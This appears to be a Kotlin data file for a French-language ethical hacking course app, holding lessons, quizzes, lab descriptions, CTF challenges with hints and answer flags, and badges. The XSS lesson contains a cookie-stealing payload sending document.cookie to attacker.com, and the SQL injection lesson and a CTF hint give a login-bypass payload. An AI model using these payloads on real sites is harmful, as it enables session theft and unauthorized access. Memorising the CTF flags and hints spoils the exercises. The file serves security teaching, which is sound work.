package com.example.data

import com.example.model.Badge
import com.example.model.CTFChallenge
import com.example.model.CourseModule
import com.example.model.LabSimulation
import com.example.model.Lesson
import com.example.model.QuizQuestion

object CyberDataRepository {

    val courseModules: List<CourseModule> = listOf(
        CourseModule(
            id = "mod_1",
            title = "1. Fondements du Piratage Éthique",
            description = "Bases juridiques, déontologie, modèle OSI et le terminal Linux.",
            iconName = "shield",
            difficulty = "Débutant",
            lessons = listOf(
                Lesson(
                    id = "m1_l1",
                    moduleId = "mod_1",
                    title = "Éthique, Législation & Chapeaux du Hacking",
                    durationMinutes = 6,
                    summary = "Comprendre les règles fondamentales du hacking éthique et la frontière légale.",
                    content = """
                    ### Qu'est-ce que le Piratage Éthique ?
                    Le **piratage éthique** (ou *Pentesting*) consiste à tester la sécurité d'un système informatique avec l'autorisation préalable de son propriétaire, dans le but d'identifier et corriger les vulnérabilités avant qu'elles ne soient exploitées par des cybercriminels.

                    ---

                    ### Les Modèles de Hackers :
                    - **White Hat (Chapeau Blanc)** : Hackers éthiques autorisés qui protègent les systèmes.
                    - **Black Hat (Chapeau Noir)** : Hackers malveillants agissant à des fins lucratives ou de nuisance.
                    - **Grey Hat (Chapeau Gris)** : Hackers agissant sans autorisation mais sans intention d'endommager (signalement de failles).

                    ---

                    ### Règle d'or absolue :
                    > **Toujours obtenir une autorisation écrite (Ordre de Mission / Mandat d'audit) avant d'effectuer le moindre test de pénétration sur une cible !** Sans mandat, scanner ou tester un serveur est un délit pénal.
                    """.trimIndent(),
                    codeSnippet = "# Exemple de charte de test autorisé :\n# Scope: 192.168.1.0/24\n# Interdiction: Attaques par Déni de Service (DoS)\n# Fenêtre d'intervention: 22h00 - 04h00",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 101,
                            question = "Quelle condition est indispensable avant tout test d'intrusion ?",
                            options = listOf(
                                "Avoir un VPN actif",
                                "Avoir une autorisation écrite signée du propriétaire",
                                "Utiliser Kali Linux",
                                "Publier les résultats sur les réseaux"
                            ),
                            correctIndex = 1,
                            explanation = "L'autorisation écrite (ordre de mission) est l'élément légal qui distingue le hacking éthique du cybercrime."
                        ),
                        QuizQuestion(
                            id = 102,
                            question = "Comment appelle-t-on les hackers éthiques bienveillants ?",
                            options = listOf("Black Hats", "Red Hats", "White Hats", "Green Hats"),
                            correctIndex = 2,
                            explanation = "Les White Hats sont les hackers éthiques travaillant à la sécurisation des systèmes."
                        )
                    )
                ),
                Lesson(
                    id = "m1_l2",
                    moduleId = "mod_1",
                    title = "Le Terminal Linux pour Analystes Cyber",
                    durationMinutes = 8,
                    summary = "Maîtriser les commandes en ligne pour naviguer et exécuter des outils de sécurité.",
                    content = """
                    ### Pourquoi Linux en Cybersécurité ?
                    La majorité des serveurs web et des distributions de sécurité (comme **Kali Linux** ou **Parrot OS**) fonctionnent sous Linux. Le terminal offre un contrôle total sur le réseau, la mémoire et le système de fichiers.

                    ---

                    ### Commandes fondamentales à connaître :
                    - `ls -la` : Lister tous les fichiers, y compris les fichiers cachés avec les permissions.
                    - `pwd` : Afficher le répertoire courant (*Print Working Directory*).
                    - `cd /chemin` : Changer de répertoire.
                    - `cat fichier.txt` : Lire le contenu d'un fichier texte.
                    - `grep "mot" fichier` : Filtrer et chercher un terme précis dans un fichier ou flux.
                    - `chmod 755 script.sh` : Modifier les droits d'exécution d'un fichier.
                    - `sudo` : Exécuter une commande avec les privilèges d'administrateur (*root*).
                    """.trimIndent(),
                    codeSnippet = "$ ls -la /var/log/auth.log\n$ grep 'Failed password' /var/log/auth.log\n$ chmod +x exploit_test.sh\n$ sudo nmap -sS 192.168.1.1",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 103,
                            question = "Quelle commande permet de rechercher un mot spécifique dans un fichier sous Linux ?",
                            options = listOf("cat", "grep", "find", "chmod"),
                            correctIndex = 1,
                            explanation = "La commande 'grep' est utilisée pour rechercher des motifs de texte dans des fichiers."
                        ),
                        QuizQuestion(
                            id = 104,
                            question = "Que signifie la commande 'sudo' ?",
                            options = listOf(
                                "Super User DO",
                                "System Under OS",
                                "Secure User Data Option",
                                "Standard Unix Download"
                            ),
                            correctIndex = 0,
                            explanation = "'sudo' signifie Super User DO, permettant d'exécuter des commandes avec privilèges d'administrateur root."
                        )
                    )
                ),
                Lesson(
                    id = "m1_l3",
                    moduleId = "mod_1",
                    title = "Protocoles Réseau & Modèle OSI",
                    durationMinutes = 7,
                    summary = "Anatomie des paquets, adresses IP et ports de services courants.",
                    content = """
                    ### Le Modèle OSI (7 Couches)
                    Pour analyser le réseau, un hacker éthique doit comprendre comment les données circulent :
                    1. **Physique** (Câbles, Ondes Wi-Fi)
                    2. **Liaison** (Adresses MAC, Switched Ethernet)
                    3. **Réseau** (Adresses IP, Routage)
                    4. **Transport** (TCP = Connexion garantie, UDP = Rapide sans vérification)
                    5. **Session**, 6. **Présentation**, 7. **Application** (HTTP, SSH, DNS, FTP)

                    ---

                    ### Les Ports de Services Incontournables :
                    - **Port 21** : FTP (Transfert de fichiers non chiffré)
                    - **Port 22** : SSH (Accès terminal sécurisé chiffré)
                    - **Port 53** : DNS (Résolution de noms de domaine)
                    - **Port 80** : HTTP (Web non chiffré)
                    - **Port 443** : HTTPS (Web chiffré avec TLS/SSL)
                    """.trimIndent(),
                    codeSnippet = "# Vérifier la connectivité avec ping et netstat :\n$ ping -c 4 google.com\n$ netstat -tuln # Lister les ports ouverts sur la machine",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 105,
                            question = "Quel port est utilisé par défaut pour le protocole web sécurisé HTTPS ?",
                            options = listOf("80", "22", "443", "8080"),
                            correctIndex = 2,
                            explanation = "Le port 443 est le port standard dédié au protocole HTTPS (HTTP Secure)."
                        )
                    )
                )
            )
        ),
        CourseModule(
            id = "mod_2",
            title = "2. Reconnaissance & Scan Réseau",
            description = "Découverte des cibles, scan de ports avec Nmap et analyse Wireshark.",
            iconName = "radar",
            difficulty = "Débutant",
            lessons = listOf(
                Lesson(
                    id = "m2_l1",
                    moduleId = "mod_2",
                    title = "OSINT & Prise d'Empreinte (Footprinting)",
                    durationMinutes = 7,
                    summary = "Collecter des informations publiques sur une cible sans déclencher d'alerte.",
                    content = """
                    ### Qu'est-ce que l'OSINT ?
                    L'**OSINT** (*Open Source Intelligence*) consiste à collecter des informations publiques légalement disponibles :
                    - Noms de domaine & enregistrements DNS via `whois` et `nslookup`.
                    - Adresses emails d'employés et technologies utilisées.
                    - Utilisation du moteur de recherche **Shodan** pour trouver des équipements connectés vulnérables.

                    ---

                    ### Google Dorking :
                    Consiste à utiliser des opérateurs avancés sur Google pour trouver des fichiers confidentiels exposés :
                    - `site:cible.com filetype:pdf confidential`
                    - `inurl:admin/login.php`
                    - `filetype:sql "dump"`
                    """.trimIndent(),
                    codeSnippet = "$ whois target-company.org\n$ nslookup -type=MX target-company.org\n$ dig target-company.org ANY",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 201,
                            question = "Que signifie l'acronyme OSINT ?",
                            options = listOf(
                                "Open Source Intelligence",
                                "Operating System Internal Network Tool",
                                "Online Security Injection Network Task",
                                "Official Server Intelligence Network"
                            ),
                            correctIndex = 0,
                            explanation = "OSINT signifie Open Source Intelligence (Renseignement d'origine source ouverte)."
                        )
                    )
                ),
                Lesson(
                    id = "m2_l2",
                    moduleId = "mod_2",
                    title = "Balayage de Ports avec Nmap",
                    durationMinutes = 9,
                    summary = "Détecter les services actifs, les versions de serveurs et les failles système.",
                    content = """
                    ### Le Couteau Suisse : Nmap
                    **Nmap** (Network Mapper) est l'outil indispensable pour découvrir les hôtes actifs et les services qui tournent sur leurs ports.

                    ---

                    ### Commandes Nmap Essentielles :
                    - `nmap 192.168.1.1` : Scan rapide des 1000 ports les plus courants.
                    - `nmap -sS 192.168.1.1` : **TCP SYN Scan** (Scan furtif à demi-ouverture).
                    - `nmap -sV 192.168.1.1` : Détection précise des **versions** des services.
                    - `nmap -O 192.168.1.1` : Détection du système d'exploitation cible.
                    - `nmap -p 1-65535 192.168.1.1` : Scan exhaustif de l'intégralité des 65 535 ports.
                    """.trimIndent(),
                    codeSnippet = "$ sudo nmap -sS -sV -O -p 22,80,443,8080 192.168.1.105\n\n# Exemple de résultat :\n# PORT     STATE SERVICE VERSION\n# 22/tcp   open  ssh     OpenSSH 8.2p1\n# 80/tcp   open  http    Apache httpd 2.4.41",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 202,
                            question = "Quelle option Nmap permet de connaître la version précise des services en cours d'exécution ?",
                            options = listOf("-sV", "-sS", "-Pn", "-p-"),
                            correctIndex = 0,
                            explanation = "L'option -sV (Service Version) interroge les ports ouverts pour déterminer la version exacte des applications."
                        )
                    )
                ),
                Lesson(
                    id = "m2_l3",
                    moduleId = "mod_2",
                    title = "Analyse de Paquets Réseau avec Wireshark",
                    durationMinutes = 8,
                    summary = "Inspecter les trames réseau pour détecter les fuites de données en clair.",
                    content = """
                    ### Analyseur de Protocoles Wireshark
                    Wireshark capture l'ensemble du trafic passant par une carte réseau (en mode promiscuité).

                    ---

                    ### Danger des Protocoles Non Chiffrés :
                    Lorsque vous utilisez **HTTP** (port 80) ou **FTP** (port 21), tous les identifiants et mots de passe transitent sous forme de texte clair !
                    Un attaquant effectuant un *Sniffing* ou un *Man-in-the-Middle (MitM)* peut lire ces secrets instantanément.

                    ---

                    ### Filtres Wireshark Utiles :
                    - `http.request.method == "POST"` : Trouve les envois de formulaires (connexions).
                    - `ip.addr == 192.168.1.50` : Filtre le trafic d'un hôte spécifique.
                    - `tcp.port == 80` : Ne montre que le trafic Web HTTP.
                    """.trimIndent(),
                    codeSnippet = "# Exemple de filtre Wireshark pour trouver des mots de passe en clair :\nhttp.request.method == \"POST\" && http contains \"password\"",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 203,
                            question = "Pourquoi est-il risqué d'envoyer des identifiants sur un site en HTTP ?",
                            options = listOf(
                                "Le site charge plus lentement",
                                "Les paquets transitent en texte clair et peuvent être interceptés",
                                "Les mots de passe sont automatiquement effacés",
                                "Le serveur ferme la connexion"
                            ),
                            correctIndex = 1,
                            explanation = "HTTP ne chiffre pas les données, permettant à quiconque capture le trafic (wireshark) d'intercepter les identifiants."
                        )
                    )
                )
            )
        ),
        CourseModule(
            id = "mod_3",
            title = "3. Sécurité Web & Vulnérabilités OWASP",
            description = "Injections SQL, attaques XSS, bruteforce et sécurisation des applications.",
            iconName = "code",
            difficulty = "Intermédiaire",
            lessons = listOf(
                Lesson(
                    id = "m3_l1",
                    moduleId = "mod_3",
                    title = "Injections SQL (SQLi) - Mécanismes & Prévention",
                    durationMinutes = 9,
                    summary = "Comprendre comment une mauvaise validation d'entrée détruit la sécurité d'une base de données.",
                    content = """
                    ### Principe de l'Injection SQL
                    Une injection SQL survient lorsqu'une application concatène directement les données saisies par l'utilisateur dans une requête SQL sans assainissement.

                    ---

                    ### Exemple de Requête Vulnérable :
                    ```sql
                    SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'USER_PASSWORD';
                    ```
                    Si l'utilisateur entre la charge utile (*payload*) suivante comme nom d'utilisateur :
                    `' OR '1'='1`
                    La requête devient :
                    ```sql
                    SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...';
                    ```
                    Comme `'1'='1'` est toujours **VRAI**, la base de données retourne le premier utilisateur de la table (souvent l'administrateur !), contournant totalement le mot de passe !

                    ---

                    ### La Seule Solution Efficace : Les Requêtes Préparées (Prepared Statements)
                    Les requêtes préparées séparent strictement le code SQL des données utilisateur.
                    """.trimIndent(),
                    codeSnippet = "// Code Sécurisé Kotlin / PDO avec requête préparée :\nval stmt = connection.prepareStatement(\"SELECT * FROM users WHERE username = ? AND password = ?\")\nstmt.setString(1, inputUser)\nstmt.setString(2, inputPass)\nval rs = stmt.executeQuery()",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 301,
                            question = "Quelle est la meilleure protection contre les injections SQL ?",
                            options = listOf(
                                "Chiffrer le nom d'utilisateur",
                                "Utiliser des requêtes préparées (Prepared Statements)",
                                "Masquer le champ mot de passe dans le HTML",
                                "Utiliser un VPN"
                            ),
                            correctIndex = 1,
                            explanation = "Les requêtes préparées dissocient la structure SQL des valeurs utilisateur, rendant l'injection impossible."
                        )
                    )
                ),
                Lesson(
                    id = "m3_l2",
                    moduleId = "mod_3",
                    title = "Cross-Site Scripting (XSS)",
                    durationMinutes = 8,
                    summary = "Injecter du code JavaScript malveillant dans les navigateurs des utilisateurs.",
                    content = """
                    ### Qu'est-ce que le XSS ?
                    Le **XSS** permet à un attaquant d'injecter des scripts côté client (JavaScript) dans des pages web consultées par d'autres utilisateurs.

                    ---

                    ### Types de XSS :
                    1. **XSS Réfléchi (Reflected)** : La charge utile est contenue dans l'URL et immédiatement renvoyée par le serveur.
                    2. **XSS Stocké (Stored)** : La charge utile est enregistrée dans la base de données (ex: commentaire d'un forum) et exécutée chez chaque visiteur !

                    ---

                    ### Impact :
                    - Vol de jetons de session / cookies (`document.cookie`).
                    - Redirection vers des sites de phishing.
                    - Keylogging des frappes au clavier.
                    """.trimIndent(),
                    codeSnippet = "<!-- Exemple de payload XSS pour vol de session -->\n<script>\n  fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));\n</script>",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 302,
                            question = "Quel langage est principalement exécuté lors d'une attaque XSS ?",
                            options = listOf("SQL", "Python", "JavaScript", "Assembly"),
                            correctIndex = 2,
                            explanation = "Le XSS vise l'exécution de code JavaScript non sollicité dans le navigateur de la victime."
                        )
                    )
                ),
                Lesson(
                    id = "m3_l3",
                    moduleId = "mod_3",
                    title = "Mots de Passe, Hachage & Sel (Salt)",
                    durationMinutes = 8,
                    summary = "Pourquoi les mots de passe ne doivent jamais être stockés en clair ou hachés avec MD5.",
                    content = """
                    ### Hachage vs Chiffrement :
                    Un **hachage** est une fonction à sens unique. On ne peut pas retrouver le mot de passe d'origine à partir du hash, mais on peut vérifier si deux entrées produisent le même hash.

                    ---

                    ### Pourquoi MD5 et SHA-1 sont Obsolètes :
                    MD5 et SHA-1 sont extrêmement rapides à calculer. Un attaquant peut tester des milliards de combinaisons par seconde avec des cartes graphiques (GPU) ou utiliser des **Rainbow Tables** (tables précalculées).

                    ---

                    ### La Bonne Pratique : Sel (Salt) + Algorithme Lourd (Bcrypt / Argon2)
                    - Le **Sel (Salt)** est une chaîne aléatoire unique ajoutée à chaque mot de passe avant hachage. Il rend les Rainbow Tables inutilisables !
                    - **Bcrypt / Argon2** ont un facteur de coût réglable qui ralentit volontairement le calcul pour bloquer le bruteforce.
                    """.trimIndent(),
                    codeSnippet = "# Mot de passe : secret123\n# MD5 (Vulnérable) : 5ebe2294ecd0e0f08eab7690d2a6ee69\n# Bcrypt avec Sel (Sécurisé) : ${'$'}2a${'$'}12${'$'}eImiTXuWVxjM72fGC47Auu94g9f3p16qjM72fGC...",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 303,
                            question = "A quoi sert le 'Sel' (Salt) dans le stockage des mots de passe ?",
                            options = listOf(
                                "Rendre le mot de passe plus long",
                                "Empêcher l'utilisation de tables arc-en-ciel (Rainbow Tables)",
                                "Chiffrer le mot de passe avec une clé RSA",
                                "Masquer les étoiles à l'écran"
                            ),
                            correctIndex = 1,
                            explanation = "Le sel garantit que deux mots de passe identiques produisent deux hashes différents, neutralisant les tables précalculées."
                        )
                    )
                )
            )
        ),
        CourseModule(
            id = "mod_4",
            title = "4. Ingénierie Sociale & Hacking Humain",
            description = "Détecter le phishing, analyser les en-têtes d'email et sécuriser les accès MFA.",
            iconName = "email",
            difficulty = "Débutant",
            lessons = listOf(
                Lesson(
                    id = "m4_l1",
                    moduleId = "mod_4",
                    title = "Attaques par Phishing (Hameçonnage)",
                    durationMinutes = 6,
                    summary = "Reconnaître les pièges de l'usurpation d'identité pour protéger les identifiants.",
                    content = """
                    ### L'Ingénierie Sociale
                    Plus de 80% des intrusions réussies commencent par une erreur humaine : un e-mail de **Phishing**.

                    ---

                    ### Indices d'un E-mail de Phishing :
                    1. **Adresse d'expédition suspecte** : `support@banque-verif-securite.com` au lieu de `support@banque.fr`.
                    2. **Urgence artificielle** : "Votre compte sera suspendu dans 2h !"
                    3. **Liens trompeurs** : L'ancre du lien affiche `https://ma-banque.fr`, mais le lien pointe vers `http://185.220.101.5/login`.
                    4. **Demande d'informations sensibles** : Un organisme sérieux ne demande jamais votre mot de passe par mail.
                    """.trimIndent(),
                    codeSnippet = "From: Banque Sécurité <no-reply@auth-update-serveur9.net>\nTo: victime@entreprise.com\nSubject: URGENT: Activité suspecte sur votre compte\nReturn-Path: <bounce@attacker-server.com>",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 401,
                            question = "Quel est l'élément le plus fiable pour vérifier l'authenticité d'un email ?",
                            options = listOf(
                                "Le logo présent dans l'image",
                                "L'adresse du domaine réel d'expédition et l'en-tête technique",
                                "La formule de politesse",
                                "Le niveau d'urgence indiqué dans le sujet"
                            ),
                            correctIndex = 1,
                            explanation = "L'adresse réelle du domaine expéditeur et les en-têtes techniques (DKIM/SPF/DMARC) sont les seuls éléments infalsifiables."
                        )
                    )
                )
            )
        ),
        CourseModule(
            id = "mod_5",
            title = "5. Cyberdéfense & Hardening Système",
            description = "Configuration de pare-feu UFW, filtrage d'accès et blindage d'infrastructures.",
            iconName = "lock",
            difficulty = "Intermédiaire",
            lessons = listOf(
                Lesson(
                    id = "m5_l1",
                    moduleId = "mod_5",
                    title = "Configuration de Pare-feu avec UFW & IPTables",
                    durationMinutes = 7,
                    summary = "Restreindre le trafic réseau entrant et bloquer les scans non autorisés.",
                    content = """
                    ### Le Rôle du Pare-feu (Firewall)
                    Un pare-feu contrôle le trafic entrant et sortant selon un ensemble de règles de sécurité strictes.

                    ---

                    ### UFW (Uncomplicated Firewall) sur Linux :
                    - `sudo ufw default deny incoming` : Bloquer tout le trafic entrant par défaut (*Principe de sécurité zéro confiance*).
                    - `sudo ufw default allow outgoing` : Autoriser les connexions sortantes.
                    - `sudo ufw allow 22/tcp` : Autoriser SSH.
                    - `sudo ufw allow 80/tcp` & `sudo ufw allow 443/tcp` : Autoriser le serveur Web.
                    - `sudo ufw enable` : Activer le pare-feu.
                    """.trimIndent(),
                    codeSnippet = "$ sudo ufw status verbose\n$ sudo ufw deny from 192.168.1.150\n$ sudo ufw limit ssh # Protection anti-bruteforce",
                    quizQuestions = listOf(
                        QuizQuestion(
                            id = 501,
                            question = "Quelle est la règle par défaut la plus sécurisée pour le trafic entrant d'un pare-feu ?",
                            options = listOf("Allow All", "Deny All (Tout refuser)", "Limit 50%", "Ignore All"),
                            correctIndex = 1,
                            explanation = "Refuser tout le trafic entrant par défaut ('Default Deny') puis autoriser uniquement le strict nécessaire est la norme de sécurité de référence."
                        )
                    )
                )
            )
        )
    )

    val labSimulations: List<LabSimulation> = listOf(
        LabSimulation(
            id = "terminal",
            title = "Simulateur Terminal Kali Linux",
            category = "Terminal CLI",
            description = "Exécutez des commandes Nmap, Ping, Whois, Hydra et Wireshark dans une console interactive réaliste.",
            difficulty = "Débutant"
        ),
        LabSimulation(
            id = "sqli",
            title = "Playground Injection SQL",
            category = "Web Security",
            description = "Testez des payloads d'injection SQL sur une mire d'authentification vulnérable vs sécurisée.",
            difficulty = "Débutant"
        ),
        LabSimulation(
            id = "xss",
            title = "Lab Cross-Site Scripting (XSS)",
            category = "Web Security",
            description = "Injectez du code JavaScript dans un espace commentaire et observez l'impact du nettoyage HTML.",
            difficulty = "Intermédiaire"
        ),
        LabSimulation(
            id = "bruteforce",
            title = "Laboratoire Hachage & Bruteforce",
            category = "Cryptographie",
            description = "Générez des hashes MD5 / SHA-256 et simulez une attaque par dictionnaire avec et sans Sel.",
            difficulty = "Intermédiaire"
        ),
        LabSimulation(
            id = "phishing",
            title = "Inspecteur Phishing & En-têtes Mail",
            category = "Social Engineering",
            description = "Inspectez des emails suspects, décelez les fausses adresses d'expédition et identifiez les pièges.",
            difficulty = "Débutant"
        )
    )

    val ctfChallenges: List<CTFChallenge> = listOf(
        CTFChallenge(
            id = "ctf_1",
            title = "CTF #1 : Le Port Secret",
            category = "Reconnaissance",
            points = 100,
            difficulty = "Facile",
            description = "L'entreprise 'TargetCorp' prétend n'avoir aucun serveur web ouvert. Utilisez le terminal interactif pour scanner l'IP 192.168.1.105 et découvrez le port non répertorié.",
            hint = "Lancez la commande 'nmap -sV 192.168.1.105' dans le Terminal Virtuel pour révéler le port.",
            targetAddress = "192.168.1.105",
            flag = "FLAG{nmap_port_8080_uncovered}"
        ),
        CTFChallenge(
            id = "ctf_2",
            title = "CTF #2 : Infiltration SQL Admin",
            category = "Web Vulnerabilities",
            points = 150,
            difficulty = "Facile",
            description = "Contournez la mire de connexion d'administration sans connaître le mot de passe en injectant la bonne charge utile SQL dans le Lab Injection SQL.",
            hint = "Entrez la charge utile ' OR '1'='1 dans le champ nom d'utilisateur dans le Lab SQLi.",
            targetAddress = "https://vuln-app.local/admin_login",
            flag = "FLAG{sqli_bypass_admin_granted}"
        ),
        CTFChallenge(
            id = "ctf_3",
            title = "CTF #3 : Le Hash MD5 du CEO",
            category = "Cryptography",
            points = 200,
            difficulty = "Moyen",
            description = "Vous avez intercepté le hash MD5 du mot de passe admin : '5ebe2294ecd0e0f08eab7690d2a6ee69'. Crackez ce hash dans le Lab Hachage & Bruteforce pour soumettre la valeur décodée.",
            hint = "Saisissez ce hash MD5 dans l'outil de décodage/bruteforce du Lab Hachage pour révéler le mot de passe secret.",
            flag = "FLAG{md5_secret123_cracked}"
        ),
        CTFChallenge(
            id = "ctf_4",
            title = "CTF #4 : L'Enquête Phishing",
            category = "Social Engineering",
            points = 150,
            difficulty = "Facile",
            description = "Un employé a reçu un mail urgent de la Banque. Inspectez l'en-tête technique dans le Lab Phishing pour trouver l'adresse IP réelle de l'attaquant.",
            hint = "Consultez l'en-tête 'Received-From' de l'email numéro 2 dans le Lab Phishing.",
            flag = "FLAG{header_spoofed_ip_185.220.101.5}"
        ),
        CTFChallenge(
            id = "ctf_5",
            title = "CTF #5 : Déchiffrement Base64 / Caesar",
            category = "Cryptography",
            points = 100,
            difficulty = "Facile",
            description = "Une chaîne de caractères suspecte a été trouvée dans un script d'exfiltration : 'RkxBR3tjeWJlcl9zaGllbGRfMjAyNn0='. Décodez cette chaîne encodée en Base64.",
            hint = "Dans le Terminal virtuel, vous pouvez taper la commande 'echo RkxBR3tjeWJlcl9zaGllbGRfMjAyNn0= | base64 -d'.",
            flag = "FLAG{cyber_shield_2026}"
        ),
        CTFChallenge(
            id = "ctf_6",
            title = "CTF #6 : Sniffing HTTP Wireshark",
            category = "Forensics",
            points = 250,
            difficulty = "Moyen",
            description = "Une capture de trames réseau HTTP a révélé une transmission de mot de passe en texte clair pour l'utilisateur 'agent_007'. Exécutez la simulation Wireshark pour extraire le mot de passe.",
            hint = "Exécutez 'wireshark -r capture.pcap' dans le Terminal Virtuel pour inspecter la requête POST.",
            flag = "FLAG{http_cleartext_pass_p3nt3st}"
        )
    )

    val defaultBadges: List<Badge> = listOf(
        Badge(
            id = "badge_first_lesson",
            title = "Premier Pas Cyber",
            description = "Terminez votre toute première leçon de formation.",
            icon = "school",
            requiredLessons = 1,
            category = "Modules"
        ),
        Badge(
            id = "badge_mod1_master",
            title = "Fondateur Éthique",
            description = "Terminez le Module #1 (Fondements du Piratage Éthique).",
            icon = "shield",
            requiredModuleId = "mod_1",
            category = "Modules"
        ),
        Badge(
            id = "badge_mod2_master",
            title = "Scanneur Réseau",
            description = "Terminez le Module #2 (Reconnaissance & Scanning).",
            icon = "terminal",
            requiredModuleId = "mod_2",
            category = "Modules"
        ),
        Badge(
            id = "badge_mod3_master",
            title = "Pénétrateur Web",
            description = "Terminez le Module #3 (Injections SQL & Vulnérabilités Web).",
            icon = "code",
            requiredModuleId = "mod_3",
            category = "Modules"
        ),
        Badge(
            id = "badge_first_ctf",
            title = "Premier Flag Capturé",
            description = "Capturez et validez votre 1er drapeau CTF.",
            icon = "flag",
            requiredCtfs = 1,
            category = "CTF"
        ),
        Badge(
            id = "badge_ctf_triad",
            title = "Chasseur de Flags",
            description = "Capturez au moins 3 drapeaux CTF stimulants.",
            icon = "bolt",
            requiredCtfs = 3,
            category = "CTF"
        ),
        Badge(
            id = "badge_ctf_master",
            title = "Grand Maître CTF",
            description = "Capturez au moins 5 drapeaux CTF exigeants.",
            icon = "trophy",
            requiredCtfs = 5,
            category = "CTF"
        ),
        Badge(
            id = "badge_first_lab",
            title = "Laborantin Cyber",
            description = "Réussissez votre premier laboratoire virtuel.",
            icon = "terminal",
            requiredLabs = 1,
            category = "Labs"
        ),
        Badge(
            id = "badge_xp_500",
            title = "Agent Niveau 2",
            description = "Accumulez un total de 500 points d'expérience (XP).",
            icon = "star",
            requiredXp = 500,
            category = "XP"
        ),
        Badge(
            id = "badge_xp_1500",
            title = "Sentinel Légendaire",
            description = "Accumulez un total de 1500 points d'expérience (XP).",
            icon = "lock",
            requiredXp = 1500,
            category = "XP"
        )
    )
}
